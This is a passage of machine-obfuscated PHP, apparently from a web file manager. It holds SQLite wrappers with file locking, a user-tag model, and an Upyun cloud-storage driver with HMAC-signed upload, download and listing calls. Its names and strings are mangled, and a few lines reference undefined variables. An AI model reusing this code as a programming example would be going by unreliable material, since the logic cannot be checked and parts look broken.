$ÊÙ·Ÿ„•[0][$Ô’ŸÒ´Ì[1004]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ÏŞ›Íá˜) { $¨áúÒ´€ =& $_SERVER[…É¦À–]; if (!CacheLock::fileLock($¨áúÒ´€[13])) { return !1; } $µÌÕ¬õ = parent::query($ÏŞ›Íá˜); CacheLock::fileUnLock($¨áúÒ´€[13]); return $µÌÕ¬õ; } public function execute($²€âÚÂ‰) { $™È‡ùÌ· =& $_SERVER[…É¦À–]; if (!CacheLock::fileLock($™È‡ùÌ·[13])) { return !1; } $‡Ì¶Ø°÷ = parent::execute($²€âÚÂ‰); CacheLock::fileUnLock($™È‡ùÌ·[13]); return $‡Ì¶Ø°÷; } } class DbSqlite3 extends DbSqlite3Base { public function query($èûó‡¦›) { $ÆâÏûºÏ =& $_SERVER[…É¦À–]; if (!CacheLock::fileLock($ÆâÏûºÏ[13])) { return !1; } $óß‰¦è¥ = parent::query($èûó‡¦›); CacheLock::fileUnLock($ÆâÏûºÏ[13]); return $óß‰¦è¥; } public function execute($¼×“×Â) { $ºŠòÌ¾ê =& $_SERVER[…É¦À–]; if (!CacheLock::fileLock($ºŠòÌ¾ê[13])) { return !1; } $æ•ãÌò— = parent::execute($¼×“×Â); CacheLock::fileUnLock($ºŠòÌ¾ê[13]); return $æ•ãÌò—; } } goto d±Ù²ÑöÊâ; BÔÁÒ·ßÖí: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\x2e\164\141\147\114\151\163\164"; public $modelType = "\x55\x73\x65\x72\117\160\164\x69\157\156"; public $field = array("\156\141\155\x65", "\163\164\x79\154\x65", "\x73\x6f\x72\164"); public function listData($Šê‘öÒ = false, $Ñåç’µ = "\163\x6f\x72\x74", $¨ÚÃ•Ú· = false) { return parent::listData($Šê‘öÒ, $Ñåç’µ, $¨ÚÃ•Ú·); } public function remove($©Ïœ¦) { return parent::remove($©Ïœ¦); } public function add($«¹ñÇê, $å¢‘£­¡ = "\154\x61\x62\x65\x6c\x2d\x67\162\x65\171\x2d\156\157\162\155\141\x6c") { $Ú—¹œË =& $_SERVER[…É¦À–]; if ($this->findByName($«¹ñÇê)) { return !1; } $î¿¹Ö´ = array($Ú—¹œË[449] => $«¹ñÇê, $Ú—¹œË[513] => $å¢‘£­¡, $Ú—¹œË[1881] => $this->getSort($Ú—¹œË[287]) + 1); return parent::insert($î¿¹Ö´); } public function update($÷°±Ëøˆ, $ôíÆ¸Õ) { $ª¤£ÁÎœ =& $_SERVER[…É¦À–]; $¨Ğ€†ÍÁ = $this->listData($÷°±Ëøˆ); $ƒà˜¢Êñ = $this->findByName($ôíÆ¸Õ[$ª¤£ÁÎœ[32]]); if (!$¨Ğ€†ÍÁ || $ƒà˜¢Êñ && $ƒà˜¢Êñ[$ª¤£ÁÎœ[428]] != $¨Ğ€†ÍÁ[$ª¤£ÁÎœ[428]]) { return !1; } return parent::update($÷°±Ëøˆ, $ôíÆ¸Õ); } public function moveTop($‡úäªÓ¶) { $’’³´Û« =& $_SERVER[…É¦À–]; $´è¬ÆÔ¡ = parent::listData(); $´Ñİ¼¬Ü = $this->getSort($’’³´Û«[286]); foreach ($´è¬ÆÔ¡ as &$í³öñŠ©) { if ($í³öñŠ©[$’’³´Û«[428]] == $‡úäªÓ¶) { $í³öñŠ©[$’’³´Û«[1901]] = $´Ñİ¼¬Ü; continue; } $í³öñŠ©[$’’³´Û«[1901]] += 1; } unset($í³öñŠ©); return parent::resetData($´è¬ÆÔ¡); } public function moveBottom($œ’°­ö) { $å¶Ô”«ö =& $_SERVER[…É¦À–]; $ôà¶ì = $this->getSort($å¶Ô”«ö[287]) + 1; return parent::update($œ’°­ö, array($å¶Ô”«ö[1901] => $ôà¶ì)); } public function resetSort($ŞÌ¹ˆÛÏ) { $“°¸ËÏã =& $_SERVER[…É¦À–]; $Á’»–ñª = array(); $ŞÌ¹ˆÛÏ = is_array($ŞÌ¹ˆÛÏ) ? $ŞÌ¹ˆÛÏ : array(); for ($¾Çœ£ªø = 0; $¾Çœ£ªø < count($ŞÌ¹ˆÛÏ); $¾Çœ£ªø++) { $Á’»–ñª[$ŞÌ¹ˆÛÏ[$¾Çœ£ªø] . $“°¸ËÏã[12]] = $¾Çœ£ªø + 1; } $ôß¯äÈ¹ = parent::listData(); foreach ($ôß¯äÈ¹ as &$¾¹Ó¢³›) { $Ïì¢şõÄ = $Á’»–ñª[$¾¹Ó¢³›[$“°¸ËÏã[428]]]; $¾¹Ó¢³›[$“°¸ËÏã[1901]] = $Ïì¢şõÄ ? $Ïì¢şõÄ : $¾¹Ó¢³›[$“°¸ËÏã[1901]]; } unset($¾¹Ó¢³›); return parent::resetData($ôß¯äÈ¹); } private function getSort($ØõÙß¤Ò) { $Ÿ»é¾»Â =& $_SERVER[…É¦À–]; $ì®ªÕ = parent::listData(); $å‹Û——å = array_to_keyvalue($ì®ªÕ, $Ÿ»é¾»Â[12], $Ÿ»é¾»Â[1901]); if (!$å‹Û——å) { $å‹Û——å = array(0); } $íÑ¸Ä”½ = $ØõÙß¤Ò == $Ÿ»é¾»Â[287] ? max($å‹Û——å) : min($å‹Û——å); return intval($íÑ¸Ä”½); } } goto DèšÉ‡Õ¯¸; CÎ‚Ò¥Ï“È: define($_SERVER[…É¦À–][270], 1); define($_SERVER[…É¦À–][271], 0); define($_SERVER[…É¦À–][272], 2); goto c¦¿‡¾ËèÀ; aÀ‹Ìºö’ù: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\x3a\x2f\x2f\166\x30\56\x61\160\x69\56\165\160\171\165\x6e\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÉŞÓÛ§) { parent::__construct(); $this->_init($ÉŞÓÛ§); } public function _init($úğÎ¹Øã) { $¸ÅªçµÁ =& $_SERVER[…É¦À–]; foreach ($úğÎ¹Øã as $ê¹ëİ¶² => $Ÿ ˆ¯õ’) { if (isset($this->{$ê¹ëİ¶²})) { $this->{$ê¹ëİ¶²} = $Ÿ ˆ¯õ’; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¸ÅªçµÁ[1484] . LNG($¸ÅªçµÁ[1415])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Î—ú¡´Å, $áÔËèœ‚ = "\x47\x45\124") { $ğÁ–ˆÛè =& $_SERVER[…É¦À–]; $ÎˆÅ€É = gmdate($ğÁ–ˆÛè[1448]); $ê£×â³Ë = base64_encode(hash_hmac($ğÁ–ˆÛè[1485], "{$áÔËèœ‚}\x26{$Î—ú¡´Å}\46{$ÎˆÅ€É}", md5("{$this->userpass}"), !0)); $·–¾Øº‹ = array("\x41\165\164\x68\x6f\162\x69\172\141\164\x69\157\156\72\125\x50\x59\x55\x4e\x20{$this->username}\x3a{$ê£×â³Ë}", "\104\141\164\x65\72{$ÎˆÅ€É}"); return $·–¾Øº‹; } public function ussRequest($æÍ’øş, $œªèï“˜ = "\107\105\124", $ò¬¹èÂç = false, $°ôÅµÄÃ = false, $’ú’ËúÄ = false) { $¿•¦£Ğ± =& $_SERVER[…É¦À–]; $æÍ’øş = trim($æÍ’øş, $¿•¦£Ğ±[8]); $˜Ü‰­º = "\x2f{$this->bucket}\57{$æÍ’øş}"; $™»Ç­… = $this->ussHeaders($˜Ü‰­º, $œªèï“˜); if ($°ôÅµÄÃ) { $™»Ç­… = array_merge($™»Ç­…, $°ôÅµÄÃ); } $µ’£Ö‚¿ = url_request($this->endpoint . $˜Ü‰­º, $œªèï“˜, $ò¬¹èÂç, $™»Ç­…, $’ú’ËúÄ); if (!$µ’£Ö‚¿) { return array($¿•¦£Ğ±[1257] => !1, $¿•¦£Ğ±[1247] => $¿•¦£Ğ±[1486]); } if (strtolower($œªèï“˜) == $¿•¦£Ğ±[197] || in_array($µ’£Ö‚¿[$¿•¦£Ğ±[1257]], array($¿•¦£Ğ±[242], $¿•¦£Ğ±[1487]))) { $ò¬¹èÂç = $µ’£Ö‚¿[$¿•¦£Ğ±[1488]]; } else { $ò¬¹èÂç = json_decode($µ’£Ö‚¿[$¿•¦£Ğ±[1247]], !0); if (!$ò¬¹èÂç) { $ò¬¹èÂç = $µ’£Ö‚¿[$¿•¦£Ğ±[1247]]; } else { if (!$µ’£Ö‚¿[$¿•¦£Ğ±[790]] && isset($ò¬¹èÂç[$¿•¦£Ğ±[1489]])) { $ò¬¹èÂç = $ò¬¹èÂç[$¿•¦£Ğ±[1489]]; } } } return array($¿•¦£Ğ±[1257] => $µ’£Ö‚¿[$¿•¦£Ğ±[790]], $¿•¦£Ğ±[1247] => $ò¬¹èÂç); } public function mkfile($áÂÖ‚–È, $ÙÜà¥·¯ = '', $İ•Óî©ş = REPEAT_RENAME) { if ($this->setContent($áÂÖ‚–È, $ÙÜà¥·¯)) { return $this->getPathOuter($áÂÖ‚–È); } return !1; } public function mkdir($±ÂØÙĞ÷, $³Í¬˜ĞÓ = REPEAT_SKIP) { $’µ‰Œ =& $_SERVER[…É¦À–]; $˜»½ë„ = trim($±ÂØÙĞ÷, $’µ‰Œ[8]); if ($this->_isFolder($˜»½ë„)) { return $this->getPathOuter($˜»½ë„); } $Öß´şØı = array($’µ‰Œ[1490]); $£¡‡¬†İ = $this->ussRequest($˜»½ë„, $’µ‰Œ[226], !1, $Öß´şØı); return $£¡‡¬†İ[$’µ‰Œ[1257]] ? $this->getPathOuter($˜»½ë„) : !1; } public function copyFile($úîåŸÖÔ, $÷“®‘ïÎ) { $Õ«¹Ù² =& $_SERVER[…É¦À–]; $™Ò’ œ = array($Õ«¹Ù²[1491] . "\57{$this->bucket}\57{$úîåŸÖÔ}", $Õ«¹Ù²[1492]); $¸í§Ş© = $this->ussRequest($÷“®‘ïÎ, $Õ«¹Ù²[228], !1, $™Ò’ œ); return $¸í§Ş©[$Õ«¹Ù²[1257]] ? !0 : $this->getPathOuter($÷“®‘ïÎ); } public function moveFile($‹Ï½œèÂ, $‡ˆ°Û) { $Ïó¯£ö’ =& $_SERVER[…É¦À–]; $ÌıšÉ›ı = array($Ïó¯£ö’[1493] . "\x2f{$this->bucket}\57{$‹Ï½œèÂ}", $Ïó¯£ö’[1492]); $¥ÁÒ³ı· = $this->ussRequest($‡ˆ°Û, $Ïó¯£ö’[228], !1, $ÌıšÉ›ı); return $¥ÁÒ³ı·[$Ïó¯£ö’[1257]] ? !0 : $this->getPathOuter($‡ˆ°Û); } public function delFile($»ê¶Ğ¸) { $§´’è„µ =& $_SERVER[…É¦À–]; $®İ°‚ù = $this->ussRequest($»ê¶Ğ¸, $§´’è„µ[1494]); return $®İ°‚ù[$§´’è„µ[1257]] ? !0 : !1; } public function delFolder($ı—Šá) { $Úõ¯Ş›œ =& $_SERVER[…É¦À–]; if (!$this->exist($ı—Šá)) { return !0; } $this->listItemCache = !1; $¥ÙêµÓü = $Ô›¾ËœË = array(); $this->fileList($ı—Šá, $¥ÙêµÓü, $Ô›¾ËœË, !0); $this->listItemCache = !0; foreach ($Ô›¾ËœË as $õ¼•™şÈ) { $ÙÌÚ”˜ğ = $this->ussRequest($õ¼•™şÈ[$Úõ¯Ş›œ[32]], $Úõ¯Ş›œ[1494]); if (!$ÙÌÚ”˜ğ[$Úõ¯Ş›œ[1257]]) { return !1; } } foreach ($¥ÙêµÓü as $ñÚÈ¢ìÎ) { $ÙÌÚ”˜ğ = $this->ussRequest($ñÚÈ¢ìÎ, $Úõ¯Ş›œ[1494]); if (!$ÙÌÚ”˜ğ[$Úõ¯Ş›œ[1257]]) { return !1; } } $ÙÌÚ”˜ğ = $this->ussRequest($ı—Šá, $Úõ¯Ş›œ[1494]); return $ÙÌÚ”˜ğ[$Úõ¯Ş›œ[1257]]; } public function rename($£³¦•Ûú, $õ–œ¥ÂÌ) { if ($this->isFile($£³¦•Ûú)) { $õ–œ¥ÂÌ = get_path_father($£³¦•Ûú) . $õ–œ¥ÂÌ; return $this->moveFile($£³¦•Ûú, $õ–œ¥ÂÌ); } return $this->renameObject($£³¦•Ûú, $õ–œ¥ÂÌ); } public function fileInfo($ÈçüÂ¾, $Â¹ñ¿ª = false, $È©»®úŞ = array()) { $˜â‚ª‘ =& $_SERVER[…É¦À–]; $û±½‚£À = array($˜â‚ª‘[32] => $this->pathThis($ÈçüÂ¾), $˜â‚ª‘[84] => $this->getPathOuter($˜â‚ª‘[8] . $ÈçüÂ¾), $˜â‚ª‘[33] => $˜â‚ª‘[200], $˜â‚ª‘[76] => isset($È©»®úŞ[$˜â‚ª‘[76]]) ? $È©»®úŞ[$˜â‚ª‘[76]] : 0, $˜â‚ª‘[174] => $this->ext($ÈçüÂ¾)); if ($Â¹ñ¿ª) { return $û±½‚£À; } $û±½‚£À[$˜â‚ª‘[201]] = $û±½‚£À[$˜â‚ª‘[85]] = 0; $û±½‚£À[$˜â‚ª‘[202]] = $û±½‚£À[$˜â‚ª‘[203]] = !0; if (empty($È©»®úŞ)) { $È©»®úŞ = $this->objectMeta($ÈçüÂ¾); if (!$È©»®úŞ) { return $û±½‚£À; } } $û±½‚£À[$˜â‚ª‘[201]] = intval($È©»®úŞ[$˜â‚ª‘[1495]]); $û±½‚£À[$˜â‚ª‘[85]] = intval($È©»®úŞ[$˜â‚ª‘[1496]]); $û±½‚£À[$˜â‚ª‘[76]] = $È©»®úŞ[$˜â‚ª‘[76]]; return $û±½‚£À; } public function folderInfo($§–ØÛ, $„‚§†Õú = false) { $ÔîÃìÀø =& $_SERVER[…É¦À–]; $ííºÀº³ = array($ÔîÃìÀø[32] => $this->pathThis($§–ØÛ), $ÔîÃìÀø[84] => $this->getPathOuter($ÔîÃìÀø[8] . $§–ØÛ), $ÔîÃìÀø[33] => $ÔîÃìÀø[75]); if ($„‚§†Õú) { return $ííºÀº³; } $ííºÀº³[$ÔîÃìÀø[201]] = $ííºÀº³[$ÔîÃìÀø[85]] = 0; $ííºÀº³[$ÔîÃìÀø[202]] = $ííºÀº³[$ÔîÃìÀø[203]] = !0; if (empty($Ãö”¤ã¶)) { $Ãö”¤ã¶ = $this->objectMeta($§–ØÛ); if (!$Ãö”¤ã¶) { return $ííºÀº³; } } $ííºÀº³[$ÔîÃìÀø[201]] = intval($Ãö”¤ã¶[$ÔîÃìÀø[1495]]); $ííºÀº³[$ÔîÃìÀø[85]] = intval($Ãö”¤ã¶[$ÔîÃìÀø[1496]]); return $ííºÀº³; } private function listObjs($ÈÀìš›×, $éşŞ¿˜ = 0, $ÄÈ¡ÖĞ = 1000) { $ÕøøÃª =& $_SERVER[…É¦À–]; $Ó•°ìÉµ = array($ÕøøÃª[1497], $ÕøøÃª[1498] . $ÄÈ¡ÖĞ); if ($éşŞ¿˜) { $Ó•°ìÉµ[] = $ÕøøÃª[1499] . $éşŞ¿˜; } $±¨†×úÙ = $this->ussRequest($ÈÀìš›×, $ÕøøÃª[230], !1, $Ó•°ìÉµ); return !$±¨†×úÙ[$ÕøøÃª[1257]] ? !1 : $±¨†×úÙ[$ÕøøÃª[1247]]; } private function fileList($ìÕ¯¶Ùæ, &$§¡ê¬ı«, &$ÖÑ«ğ, $±ë—Ô£ı = false) { $ñ‰ÔÂ‡£ =& $_SERVER[…É¦À–]; $©¶Öî¤€ = $ñ‰ÔÂ‡£[12]; $º÷µøÉ = 1000; $ûÄ·”× = rtrim($ìÕ¯¶Ùæ, $ñ‰ÔÂ‡£[8]) . $ñ‰ÔÂ‡£[8]; while (!0) { check_abort(); $ı¦¦„¤­ = $this->listObjs($ìÕ¯¶Ùæ, $©¶Öî¤€, $º÷µøÉ); if (!$ı¦¦„¤­) { return !1; } $©¶Öî¤€ = isset($ı¦¦„¤­[$ñ‰ÔÂ‡£[1500]]) ? $ı¦¦„¤­[$ñ‰ÔÂ‡£[1500]] : $ñ‰ÔÂ‡£[12]; $Çæ»—²— = isset($ı¦¦„¤­[$ñ‰ÔÂ‡£[1501]]) ? $ı¦¦„¤­[$ñ‰ÔÂ‡£[1501]] : array(); foreach ($Çæ»—²— as $êó”‰½Õ) { $™ñÈ«ºâ = $êó”‰½Õ[$ñ‰ÔÂ‡£[33]] == $ñ‰ÔÂ‡£[75] ? !0 : !1; $ê¬ø»ŠÔ = ltrim($ûÄ·”× . $êó”‰½Õ[$ñ‰ÔÂ‡£[32]], $ñ‰ÔÂ‡£[8]) . ($™ñÈ«ºâ ? $ñ‰ÔÂ‡£[8] : $ñ‰ÔÂ‡£[12]); $óè´æ¾ = array($ñ‰ÔÂ‡£[32] => $ê¬ø»ŠÔ, $ñ‰ÔÂ‡£[33] => $™ñÈ«ºâ ? $ñ‰ÔÂ‡£[75] : $ñ‰ÔÂ‡£[200], $ñ‰ÔÂ‡£[76] => $êó”‰½Õ[$ñ‰ÔÂ‡£[366]], $ñ‰ÔÂ‡£[1496] => $êó”‰½Õ[$ñ‰ÔÂ‡£[1502]]); $this->cacheMethodInfoSet($ê¬ø»ŠÔ, $™ñÈ«ºâ, $óè´æ¾); if ($™ñÈ«ºâ) { $§¡ê¬ı«[] = $ê¬ø»ŠÔ; if ($±ë—Ô£ı) { $this->fileList($ê¬ø»ŠÔ, $§¡ê¬ı«, $ÖÑ«ğ, $±ë—Ô£ı); } continue; } $ÖÑ«ğ[] = $óè´æ¾; } if (count($Çæ»—²—) < $º÷µøÉ) { break; } } $this->cacheMethodInfoSet($ìÕ¯¶Ùæ, !0); } public function listPath($í˜õÌë³, $Ë¤» = false) { $õÆ¢é¦ı =& $_SERVER[…É¦À–]; $°Â¬ÙæÔ = $¿Íğ µº = array(); $this->fileList($í˜õÌë³, $°Â¬ÙæÔ, $¿Íğ µº); foreach ($°Â¬ÙæÔ as $Ã×şÈá› => $‹¬…Çä¦) { $°Â¬ÙæÔ[$Ã×şÈá›] = $this->folderInfo($‹¬…Çä¦, $Ë¤»); } foreach ($¿Íğ µº as $Ã×şÈá› => $‹¬…Çä¦) { $¿Íğ µº[$Ã×şÈá›] = $this->fileInfo($‹¬…Çä¦[$õÆ¢é¦ı[32]], $Ë¤», $‹¬…Çä¦); } return array($õÆ¢é¦ı[82] => $°Â¬ÙæÔ, $õÆ¢é¦ı[83] => $¿Íğ µº); } public function has($¾¦óº±, $éÇ­º³Š = false, $œÖš½´ğ = true) { $…Ã¥Åıö =& $_SERVER[…É¦À–]; $ë¾ˆ×ø = $…Ã¥Åıö[12]; $“ß€ø‡ = 500; $´â€¶§ = 0; $Ûµ¸ãÁ€ = 0; $¿ÒÅ¬Ùø = rtrim($¾¦óº±, $…Ã¥Åıö[8]) . $…Ã¥Åıö[8]; while (!0) { check_abort(); $±Ï‘úş = $this->listObjs($¾¦óº±, $ë¾ˆ×ø, $“ß€ø‡); if (!$±Ï‘úş) { return !1; } $ë¾ˆ×ø = isset($±Ï‘úş[$…Ã¥Åıö[1500]]) ? $±Ï‘úş[$…Ã¥Åıö[1500]] : $…Ã¥Åıö[12]; $âÚŠ”ö = isset($±Ï‘úş[$…Ã¥Åıö[1501]]) ? $±Ï‘úş[$…Ã¥Åıö[1501]] : array(); if (empty($âÚŠ”ö)) { break; } $âåâ˜¨¥ = array_filter($âÚŠ”ö, function ($’âË‚˜²) { $àåä›Õ” =& $_SERVER[…É¦À–]; return $’âË‚˜²[$àåä›Õ”[33]] == $àåä›Õ”[75]; }); $ıÊÖÀ‰“ = count($âÚŠ”ö); $âåâ˜¨¥ = count($âåâ˜¨¥); $Ü¬ıØ¸ö = $ıÊÖÀ‰“ - $âåâ˜¨¥; if ($éÇ­º³Š) { $Ûµ¸ãÁ€ += $âåâ˜¨¥; $´â€¶§ += $Ü¬ıØ¸ö; if ($ıÊÖÀ‰“ < $“ß€ø‡) { break; } continue; } if ($œÖš½´ğ) { if ($Ü¬ıØ¸ö) { return !0; } } else { if ($âåâ˜¨¥) { return !0; } } if ($ıÊÖÀ‰“ < $“ß€ø‡) { break; } } if ($éÇ­º³Š) { return array($…Ã¥Åıö[207] => $´â€¶§, $…Ã¥Åıö[208] => $Ûµ¸ãÁ€); } return !1; } public function listAll($Õ»äñ‹–) { $»Ğ‹²— =& $_SERVER[…É¦À–]; $«ï€²‡ = $¥é±Èû´ = array(); $this->fileList($Õ»äñ‹–, $«ï€²‡, $¥é±Èû´, !0); $üòˆÄ¼Ú = array_to_keyvalue($¥é±Èû´, $»Ğ‹²—[32]); foreach ($«ï€²‡ as $Ñ¿¦Á¤ù) { if (is_string($Ñ¿¦Á¤ù)) { $üòˆÄ¼Ú[$Ñ¿¦Á¤ù] = array($»Ğ‹²—[76] => 0); } } return $this->listAllFiles($Õ»äñ‹–, $üòˆÄ¼Ú); } public function canRead($áÏ»›Æ) { return $this->exist($áÏ»›Æ) ? !0 : !1; } public function canWrite($¡ÁøÕœË) { return $this->exist($¡ÁøÕœË) ? !0 : !1; } public function getContent($èô±şú) { return $this->fileSubstr($èô±şú, 0, -1); } public function setContent($ôÃˆÏ’ù, $øú¬´Œš = '') { $Á×–ÔªÃ =& $_SERVER[…É¦À–]; if (!$øú¬´Œš) { $äù˜Ôó² = $this->ussRequest($ôÃˆÏ’ù, $Á×–ÔªÃ[226]); return $äù˜Ôó²[$Á×–ÔªÃ[1257]]; } $ ÀŒöƒî = $this->tempFile($this->pathThis($ôÃˆÏ’ù)); file_put_contents($ ÀŒöƒî, $øú¬´Œš); if ($this->upload($ôÃˆÏ’ù, $ ÀŒöƒî)) { $this->tempFileRemve($ ÀŒöƒî); return !0; } return !1; } public function fileSubstr($ÕÙÙÕ´Ğ, $™ÀíºÔ›, $‚£ˆÌ) { $¶ìÑªĞá =& $_SERVER[…É¦À–]; if (!($Ëôîƒ¹Â = $this->link($ÕÙÙÕ´Ğ))) { return !1; } $¨’Œ§¹ = !1; if ($‚£ˆÌ > 0) { $ÔÇíÁ¢¯ = $™ÀíºÔ› + $‚£ˆÌ - 1; $¨’Œ§¹ = array($¶ìÑªĞá[1463] . $™ÀíºÔ› . $¶ìÑªĞá[415] . $ÔÇíÁ¢¯); } $ã”ÒÙÚø = url_request($Ëôîƒ¹Â, $¶ìÑªĞá[230], !1, $¨’Œ§¹); return $ã”ÒÙÚø[$¶ìÑªĞá[790]] ? $ã”ÒÙÚø[$¶ìÑªĞá[1247]] : !1; } public function upload($ŒÒ×³òì, $Ä“Õê¼Ø, $ªü¸ĞĞ† = false, $×ú„­şò = REPEAT_REPLACE) { $Óµ×Ù =& $_SERVER[…É¦À–]; $Å½‚ˆı¨ = IO::size($Ä“Õê¼Ø); if ($Å½‚ˆı¨ <= 1024 * 1024 * 200) { $Ò¾Ÿø¢— = array($Óµ×Ù[1503] . $Ä“Õê¼Ø); $šØ†Œ‰± = $this->ussRequest($ŒÒ×³òì, $Óµ×Ù[228], $Ò¾Ÿø¢—); return $šØ†Œ‰±[$Óµ×Ù[1257]] ? $this->getPathOuter($ŒÒ×³òì) : !1; } $§…“İÍ¼ = 1024 * 1024 * 10; $Õ•›ñìñ = array($Óµ×Ù[1504], $Óµ×Ù[1505] . $Å½‚ˆı¨, $Óµ×Ù[1506], $Óµ×Ù[1507] . $§…“İÍ¼); $šØ†Œ‰± = $this->ussRequest($ŒÒ×³òì, $Óµ×Ù[228], !1, $Õ•›ñìñ); if (!$šØ†Œ‰±[$Óµ×Ù[1257]]) { return !1; } $ëîÔÕËé = $šØ†Œ‰±[$Óµ×Ù[1247]]; $¨„Îò¢Í = 0; $áÛÚÑ = $ëîÔÕËé[$Óµ×Ù[1508]]; $éª„…ã¹ = fopen($Ä“Õê¼Ø, $Óµ×Ù[1412]); if (!$éª„…ã¹) { return !1; } do { $ø«¥ÕÀÜ = $ëîÔÕËé[$Óµ×Ù[1509]]; fseek_64($éª„…ã¹, $¨„Îò¢Í); $Û‹Ù˜ß = fread($éª„…ã¹, $ø«¥ÕÀÜ); $ˆœş¼® = 0; do { $ˆœş¼®++; $ëîÔÕËé = $this->uploadPart($ŒÒ×³òì, $ëîÔÕËé, $Û‹Ù˜ß); } while (!$ëîÔÕËé && $ˆœş¼® < 3); if (!$ëîÔÕËé) { return !1; } $áÛÚÑ = $ëîÔÕËé[$Óµ×Ù[1508]]; $¨„Îò¢Í += $ø«¥ÕÀÜ; } while ($áÛÚÑ != -1); fclose($éª„…ã¹); $Õ•›ñìñ = array($Óµ×Ù[1510], $Óµ×Ù[1511] . $ëîÔÕËé[$Óµ×Ù[1512]], $Óµ×Ù[1506]); $šØ†Œ‰± = $this->ussRequest($ŒÒ×³òì, $Óµ×Ù[228], !1, $Õ•›ñìñ); return $šØ†Œ‰±[$Óµ×Ù[1257]] ? $this->getPathOuter($«±¸ÚçÖ) : !1; } private function uploadPart($Ø£‚‰İû, $ı•ü‚Â£, &$Ü©üïî) { $¬ñ›ıæ =& $_SERVER[…É¦À–]; $ëëÛú­ = array($¬ñ›ıæ[1513], $¬ñ›ıæ[1511] . $ı•ü‚Â£[$¬ñ›ıæ[1512]], $¬ñ›ıæ[1514] . $ı•ü‚Â£[$¬ñ›ıæ[1508]], $¬ñ›ıæ[142] . $ı•ü‚Â£[$¬ñ›ıæ[1509]]); $¬Ş×¬ê = $this->ussRequest($Ø£‚‰İû, $¬ñ›ıæ[228], $Ü©üïî, $ëëÛú­); return !$¬Ş×¬ê[$¬ñ›ıæ[1257]] ? $¬Ş×¬ê[$¬ñ›ıæ[1257]] : $¬Ş×¬ê[$¬ñ›ıæ[1247]]; } public function uploadFormData($¦ó¡ĞË–, $ïØü Ê = 3600) { return $this->uploadPolicy($¦ó¡ĞË–, $ïØü Ê); } public function multiUploadFormData($„–ÅöÙë, $ÊËÎÄáí = 3600) { $½àóó´ª =& $_SERVER[…É¦À–]; $‹áèóòÏ = (int) $GLOBALS[$½àóó´ª[7]][$½àóó´ª[76]]; return $this->uploadPolicy($„–ÅöÙë, $ÊËÎÄáí, $‹áèóòÏ); } private function uploadPolicy($÷•¼³Ü³, $ÚÎÓàŒ¯ = 3600, $ãÍŠÁí¹ = 0) { $¸ĞÙÉ¹ =& $_SERVER[…É¦À–]; $·÷Û‚²¾ = $¸ĞÙÉ¹[8] . $this->bucket; $ÂÑÌîÁ = gmdate($¸ĞÙÉ¹[1448]); $ÀàÏ¦ÂÎ = array($¸ĞÙÉ¹[1515] => $this->bucket, $¸ĞÙÉ¹[1516] => $÷•¼³Ü³, $¸ĞÙÉ¹[1517] => time() + $ÚÎÓàŒ¯, $¸ĞÙÉ¹[1518] => $ÂÑÌîÁ); if ($ãÍŠÁí¹) { $ÀàÏ¦ÂÎ[$¸ĞÙÉ¹[1428]] = $ãÍŠÁí¹; } $„¾¯ış´ = base64_encode(json_encode($ÀàÏ¦ÂÎ)); $Áíı = base64_encode(hash_hmac($¸ĞÙÉ¹[1485], "\120\x4f\123\124\x26{$·÷Û‚²¾}\x26{$ÂÑÌîÁ}\46{$„¾¯ış´}", md5("{$this->userpass}"), !0)); $“€çÖˆ’ = array($¸ĞÙÉ¹[261] => $„¾¯ış´, $¸ĞÙÉ¹[1519] => "\125\120\131\125\x4e\40{$this->username}\72{$Áíı}", $¸ĞÙÉ¹[182] => $this->endpoint . $·÷Û‚²¾); return $“€çÖˆ’; } public function download($›ê·İ—, $«Ø“œ§Ø) { $‰ÚØ×àı = IO::getPathInner(IO::mkfile($«Ø“œ§Ø)); if (!($è¥¶ºÈ = $this->link($›ê·İ—))) { return !1; } $‡ğ¬øãó = 0; $‘éü®Ò­ = 1024 * 200; $µÑ¶—Ôí = fopen($‰ÚØ×àı, $_SERVER[…É¦À–][1469]); while (!0) { $ÅÔ¦ÚÓ– = $this->fileSubstr($›ê·İ—, $‡ğ¬øãó, $‘éü®Ò­); if ($ÅÔ¦ÚÓ– === !1) { return !1; } fwrite($µÑ¶—Ôí, $ÅÔ¦ÚÓ–); $‡ğ¬øãó += $‘éü®Ò­; if (strlen($ÅÔ¦ÚÓ–) < $‘éü®Ò­) { break; } } fclose($µÑ¶—Ôí); return $«Ø“œ§Ø; } public function link($ÕÙ¼ó¢, $à”ç½´Ê = array()) { $˜¿›îÁº =& $_SERVER[…É¦À–]; $ÕÙ¼ó¢ = trim($ÕÙ¼ó¢, $˜¿›îÁº[8]); if (!empty($this->token)) { $—å·ş¾¥ = strtotime(date($˜¿›îÁº[1520])); $Ÿ¼ò½ŠÂ = substr(md5($this->token . $˜¿›îÁº[313] . $—å·ş¾¥ . $˜¿›îÁº[1521] . $ÕÙ¼ó¢), 12, 8) . $—å·ş¾¥; $à”ç½´Ê[] = $˜¿›îÁº[1522] . $Ÿ¼ò½ŠÂ; } $¸ùÎäè = !empty($à”ç½´Ê) ? $˜¿›îÁº[73] . implode($˜¿›îÁº[313], $à”ç½´Ê) : $˜¿›îÁº[12]; return $this->getHost() . $˜¿›îÁº[8] . $ÕÙ¼ó¢ . $¸ùÎäè; } public function fileOut($šŞ„Š¾Û, $û®­¦Œö = false, $…¨×¢•á = false, $êÍØ®ÎÏ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($šŞ„Š¾Û, $û®­¦Œö, $…¨×¢•á, $êÍØ®ÎÏ); } if (!$…¨×¢•á) { $…¨×¢•á = $this->pathThis($šŞ„Š¾Û); } $¼Õ”«ÓÇ = $û®­¦Œö ? array($_SERVER[…É¦À–][1523] . rawurlencode($…¨×¢•á)) : array(); $°™Ïşœ = $this->link($šŞ„Š¾Û, $¼Õ”«ÓÇ); $this->fileOutLink($°™Ïşœ); } public function fileOutServer($çíÚã©Ï, $Øñ¦…Ë€ = false, $õİ°É© = false, $ä—Ä¬¹ = '') { parent::fileOut($çíÚã©Ï, $Øñ¦…Ë€, $õİ°É©, $ä—Ä¬¹); } public function fileOutImage($´»ºâè, 